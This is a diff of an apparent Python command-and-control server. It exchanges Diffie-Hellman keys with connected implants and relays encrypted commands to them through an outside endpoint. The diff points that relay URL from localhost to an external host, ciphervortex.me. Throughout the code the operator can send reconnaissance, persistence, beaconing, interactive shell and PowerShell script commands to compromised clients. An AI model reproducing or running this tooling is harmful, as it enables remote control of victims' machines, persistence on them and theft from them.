@@ -21,8 +21,9 @@ server_socket = None
 server_running = True
 
 def send_to_endpoint(data):
-    # url = "https://ciphervortex.me:8081/querynest"
-    url = "http://127.0.0.1:8081/querynest"
+    url = "https://ciphervortex.me:8081/querynest"
+    # url = "https://cybernova.me:8081/querynest"
+    # url = "http://127.0.0.1:8081/querynest"
     try:
         response = requests.post(url, data=data, headers={"Content-Type": "text/plain"})
         response.raise_for_status()
@@ -44,15 +45,18 @@ dh_prime = int("FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
                "E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9"
                "DE2BCBF6955817183995497CEA956AE515D2261898FA0510"
                "15728E5A8AACAA68FFFFFFFFFFFFFFFF", 16)
+
 dh_generator = 2
 def perform_diffie_hellman(client_socket,client_public_key):
     private_key = bytes_to_long(get_random_bytes(16))  
     public_key = pow(dh_generator, private_key, dh_prime)
+    # print(f"Sending Key : {binascii.hexlify(long_to_bytes(public_key))}")
     send_to_endpoint(binascii.hexlify(long_to_bytes(public_key)))
     shared_secret = pow(int(client_public_key.decode(),16), private_key, dh_prime)
     KEY = hashlib.sha256(long_to_bytes(shared_secret)).digest()[:16]
     print("Shared Key :",KEY.hex())
     return KEY
+
 
 def update_script_table():
     scripts = os.listdir('scripts/')
@@ -174,6 +178,7 @@ def handle_client(client_socket):
         ]
         recon_output = {}
         for command in recon_commands:
+            # print(f"Sending Data : {enc_all_input(command)}")
             send_to_endpoint(enc_all_input(command))
             size_message = b""
             while len(size_message) < 8:
@@ -182,7 +187,7 @@ def handle_client(client_socket):
                     break
                 size_message += b
             total_size = int(size_message.decode())
-            output = b""        
+            output = b""       
             while len(output) < total_size:
                 chunk = client_socket.recv(1024)
                 if not chunk:
@@ -260,6 +265,7 @@ def input_thread():
             server_running = False
             with clients_lock:
                 for client_sock in list(clients.keys()):
+                    # print(f"Sending data : b'EXIT_SERVER'")
                     send_to_endpoint(b"EXIT_SERVER")
                     client_sock.close()
             server_socket.close()
@@ -303,6 +309,7 @@ def input_thread():
                     print("\n")
                     exec_command = input("$ ")
                     if exec_command.lower() in ['q', 'e', 'quit', 'exit']:
+                        # print(f"Sending Data : f'EXIT_CLIENT {client_ip_selected}'.encode()")
                         send_to_endpoint(f"EXIT_CLIENT {client_ip_selected}".encode())
                         client_sock.close()
                         with clients_lock:
@@ -312,12 +319,16 @@ def input_thread():
                         print('\n')
                         break
                     elif exec_command.lower().startswith('persist'):
+                        # print(f"Sending Data : {enc_all_input('PERSISTENT ' + exec_command[8:])}")
                         send_to_endpoint(enc_all_input("PERSISTENT "+ exec_command[8:]))
                     elif exec_command.lower().startswith('beacon'):
+                        # print(f"Sending Data : {enc_all_input('BEACON ' + exec_command[7:])}")
                         send_to_endpoint(enc_all_input("BEACON "+ exec_command[7:]))
                     elif exec_command.lower().startswith('close'):
+                        # print(f"Sending Data : {enc_all_input('CLOSE')}")
                         send_to_endpoint(enc_all_input("CLOSE"))                    
                     elif exec_command.lower() == 'shell':
+                        # print(f"Sending Data : {enc_all_input('SHELL')}")
                         send_to_endpoint(enc_all_input("SHELL")) 
                         while(exec_command != 'exit'):
                             size_message = b""
@@ -337,6 +348,7 @@ def input_thread():
                             print(output,end='')
                             exec_command = input()
                             send_to_endpoint(enc_all_input(exec_command+'\n'))
+                            # print(f"Sending Data : {enc_all_input(exec_command + '\\n')}")
                     elif exec_command.lower() == 'script':
                         while True:
                             print("\nScript menu\n")
@@ -361,10 +373,13 @@ def input_thread():
                             if os.path.isfile(script_filename) and script_filename.endswith('.ps1'):
                                 to_send = ""
                                 send_to_endpoint(enc_all_input("SCRIPT_START"))
+                                # print(f"Sending Data : {enc_all_input('SCRIPT_START')}") 
                                 with open(script_filename, 'r') as script_file:
                                     for line in script_file:
                                         to_send += (line)
+                                        # print(f"Sending Data : {enc_all_input(line)}")
                                 to_send += ("SCRIPT_END")
+                                # print(f"Sending Data : {enc_all_input('SCRIPT_END')}")
                                 sleep(4)
                                 send_to_endpoint(enc_all_input(to_send))
                                 print("\n")
@@ -381,12 +396,13 @@ def input_thread():
                                     decrypted_output = dec_all_input(output).replace(';;;', '')
                                     print(decrypted_output)
                                 else:
-                                    print("Script has executed, but there is no output :)\n\n")
+                                    print("Script has executed, but there is no output.\n\n")
                             else:
                                 print("File does not exist or invalid extension.\n\n")
                     else:
                         command = exec_command
                         send_to_endpoint(enc_all_input(command))
+                        # print(f"Sending Data : {enc_all_input(command)}")
                         size_message = b""
                         while len(size_message) < 8:
                             b = client_sock.recv(8-len(size_message))
